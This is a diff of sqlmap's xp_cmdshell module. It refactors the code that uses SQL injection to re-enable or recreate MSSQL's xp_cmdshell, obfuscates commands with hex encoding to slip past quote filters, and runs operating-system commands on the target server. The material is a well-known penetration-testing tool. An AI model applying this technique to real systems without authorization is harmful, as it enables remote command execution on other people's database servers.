@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 
 """
-Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
+Copyright (c) 2006-2013 sqlmap developers (http://sqlmap.org/)
 See the file 'doc/COPYING' for copying permission
 """
 
@@ -18,7 +18,7 @@ from lib.core.common import pushValue
 from lib.core.common import popValue
 from lib.core.common import randomStr
 from lib.core.common import readInput
-from lib.core.common import wasLastRequestDelayed
+from lib.core.common import wasLastResponseDelayed
 from lib.core.convert import hexencode
 from lib.core.data import conf
 from lib.core.data import kb
@@ -28,12 +28,11 @@ from lib.core.enums import DBMS
 from lib.core.enums import EXPECTED
 from lib.core.enums import HASHDB_KEYS
 from lib.core.enums import PAYLOAD
-from lib.core.exception import sqlmapUnsupportedFeatureException
+from lib.core.exception import SqlmapUnsupportedFeatureException
 from lib.core.threads import getCurrentThreadData
-from lib.core.unescaper import unescaper
 from lib.request import inject
 
-class xp_cmdshell:
+class Xp_cmdshell:
     """
     This class defines methods to deal with Microsoft SQL Server
     xp_cmdshell extended procedure for plugins.
@@ -42,7 +41,7 @@ class xp_cmdshell:
     def __init__(self):
         self.xpCmdshellStr = "master..xp_cmdshell"
 
-    def __xpCmdshellCreate(self):
+    def _xpCmdshellCreate(self):
         cmd = ""
 
         if Backend.isVersionWithin(("2005", "2008")):
@@ -51,18 +50,18 @@ class xp_cmdshell:
             cmd = getSQLSnippet(DBMS.MSSQL, "activate_sp_oacreate")
             inject.goStacked(agent.runAsDBMSUser(cmd))
 
-        self.__randStr = randomStr(lowercase=True)
-        self.__xpCmdshellNew = "xp_%s" % randomStr(lowercase=True)
-        self.xpCmdshellStr = "master..%s" % self.__xpCmdshellNew
+        self._randStr = randomStr(lowercase=True)
+        self._xpCmdshellNew = "xp_%s" % randomStr(lowercase=True)
+        self.xpCmdshellStr = "master..%s" % self._xpCmdshellNew
 
-        cmd = getSQLSnippet(DBMS.MSSQL, "create_new_xp_cmdshell", RANDSTR=self.__randStr, XP_CMDSHELL_NEW=self.__xpCmdshellNew)
+        cmd = getSQLSnippet(DBMS.MSSQL, "create_new_xp_cmdshell", RANDSTR=self._randStr, XP_CMDSHELL_NEW=self._xpCmdshellNew)
 
         if Backend.isVersionWithin(("2005", "2008")):
             cmd += ";RECONFIGURE WITH OVERRIDE"
 
         inject.goStacked(agent.runAsDBMSUser(cmd))
 
-    def __xpCmdshellConfigure2005(self, mode):
+    def _xpCmdshellConfigure2005(self, mode):
         debugMsg = "configuring xp_cmdshell using sp_configure "
         debugMsg += "stored procedure"
         logger.debug(debugMsg)
@@ -71,7 +70,7 @@ class xp_cmdshell:
 
         return cmd
 
-    def __xpCmdshellConfigure2000(self, mode):
+    def _xpCmdshellConfigure2000(self, mode):
         debugMsg = "configuring xp_cmdshell using sp_addextendedproc "
         debugMsg += "stored procedure"
         logger.debug(debugMsg)
@@ -83,21 +82,21 @@ class xp_cmdshell:
 
         return cmd
 
-    def __xpCmdshellConfigure(self, mode):
+    def _xpCmdshellConfigure(self, mode):
         if Backend.isVersionWithin(("2005", "2008")):
-            cmd = self.__xpCmdshellConfigure2005(mode)
+            cmd = self._xpCmdshellConfigure2005(mode)
         else:
-            cmd = self.__xpCmdshellConfigure2000(mode)
+            cmd = self._xpCmdshellConfigure2000(mode)
 
         inject.goStacked(agent.runAsDBMSUser(cmd))
 
-    def __xpCmdshellCheck(self):
+    def _xpCmdshellCheck(self):
         cmd = "ping -n %d 127.0.0.1" % (conf.timeSec * 2)
         self.xpCmdshellExecCmd(cmd)
 
-        return wasLastRequestDelayed()
+        return wasLastResponseDelayed()
 
-    def __xpCmdshellTest(self):
+    def _xpCmdshellTest(self):
         threadData = getCurrentThreadData()
         pushValue(threadData.disableStdOut)
         threadData.disableStdOut = True
@@ -161,10 +160,10 @@ class xp_cmdshell:
 
         # Obfuscate the command to execute, also useful to bypass filters
         # on single-quotes
-        self.__randStr = randomStr(lowercase=True)
-        self.__cmd = "0x%s" % hexencode(cmd)
-        self.__forgedCmd = "DECLARE @%s VARCHAR(8000);" % self.__randStr
-        self.__forgedCmd += "SET @%s=%s;" % (self.__randStr, self.__cmd)
+        self._randStr = randomStr(lowercase=True)
+        self._cmd = "0x%s" % hexencode(cmd)
+        self._forgedCmd = "DECLARE @%s VARCHAR(8000);" % self._randStr
+        self._forgedCmd += "SET @%s=%s;" % (self._randStr, self._cmd)
 
         # Insert the command standard output into a support table,
         # 'sqlmapoutput', except when DBMS credentials are provided because
@@ -172,15 +171,14 @@ class xp_cmdshell:
         # retrieve the output when OPENROWSET is used hence the redirection
         # to a temporary file from above
         if insertIntoTable and not conf.dbmsCred:
-            self.__forgedCmd += "INSERT INTO %s " % insertIntoTable
+            self._forgedCmd += "INSERT INTO %s(data) " % insertIntoTable
 
-        self.__forgedCmd += "EXEC %s @%s" % (self.xpCmdshellStr, self.__randStr)
+        self._forgedCmd += "EXEC %s @%s" % (self.xpCmdshellStr, self._randStr)
 
-        return agent.runAsDBMSUser(self.__forgedCmd)
+        return agent.runAsDBMSUser(self._forgedCmd)
 
     def xpCmdshellExecCmd(self, cmd, silent=False):
-        cmd = self.xpCmdshellForgeCmd(cmd)
-        return inject.goStacked(cmd, silent)
+        return inject.goStacked(self.xpCmdshellForgeCmd(cmd), silent)
 
     def xpCmdshellEvalCmd(self, cmd, first=None, last=None):
         if conf.direct:
@@ -207,18 +205,18 @@ class xp_cmdshell:
                 inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, self.tmpFile, randomStr(10), randomStr(10)))
                 self.delRemoteFile(self.tmpFile)
 
-            query = "SELECT %s FROM %s" % (self.tblField, self.cmdTblName)
+            query = "SELECT %s FROM %s ORDER BY id" % (self.tblField, self.cmdTblName)
 
-            if conf.direct or any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR)):
-                output = inject.getValue(query, resumeValue=False, blind=False)
+            if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
+                output = inject.getValue(query, resumeValue=False, blind=False, time=False)
             else:
                 output = []
-                count = inject.getValue("SELECT COUNT(*) FROM %s" % self.cmdTblName, resumeValue=False, inband=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
+                count = inject.getValue("SELECT COUNT(id) FROM %s" % self.cmdTblName, resumeValue=False, union=False, error=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
 
                 if isNumPosStrValue(count):
                     for index in getLimitRange(count):
                         query = agent.limitQuery(index, query, self.tblField)
-                        output.append(inject.getValue(query, inband=False, error=False, resumeValue=False))
+                        output.append(inject.getValue(query, union=False, error=False, resumeValue=False))
 
             inject.goStacked("DELETE FROM %s" % self.cmdTblName)
 
@@ -238,7 +236,7 @@ class xp_cmdshell:
             infoMsg += "available, please wait.."
             logger.info(infoMsg)
 
-            result = self.__xpCmdshellCheck()
+            result = self._xpCmdshellCheck()
 
             if result:
                 logger.info("xp_cmdshell extended procedure is available")
@@ -251,9 +249,9 @@ class xp_cmdshell:
                 choice = readInput(message, default="Y")
 
                 if not choice or choice in ("y", "Y"):
-                    self.__xpCmdshellConfigure(1)
+                    self._xpCmdshellConfigure(1)
 
-                    if self.__xpCmdshellCheck():
+                    if self._xpCmdshellCheck():
                         logger.info("xp_cmdshell re-enabled successfully")
                         kb.xpCmdshellAvailable = True
 
@@ -261,10 +259,10 @@ class xp_cmdshell:
                         logger.warn("xp_cmdshell re-enabling failed")
 
                         logger.info("creating xp_cmdshell with sp_OACreate")
-                        self.__xpCmdshellConfigure(0)
-                        self.__xpCmdshellCreate()
+                        self._xpCmdshellConfigure(0)
+                        self._xpCmdshellCreate()
 
-                        if self.__xpCmdshellCheck():
+                        if self._xpCmdshellCheck():
                             logger.info("xp_cmdshell created successfully")
                             kb.xpCmdshellAvailable = True
 
@@ -277,7 +275,7 @@ class xp_cmdshell:
 
             if not kb.xpCmdshellAvailable:
                 errMsg = "unable to proceed without xp_cmdshell"
-                raise sqlmapUnsupportedFeatureException, errMsg
+                raise SqlmapUnsupportedFeatureException(errMsg)
 
         debugMsg = "creating a support table to write commands standard "
         debugMsg += "output to"
@@ -287,4 +285,4 @@ class xp_cmdshell:
         # "The text, ntext, and image data types cannot be compared or sorted"
         self.createSupportTbl(self.cmdTblName, self.tblField, "NVARCHAR(4000)")
 
-        self.__xpCmdshellTest()
+        self._xpCmdshellTest()
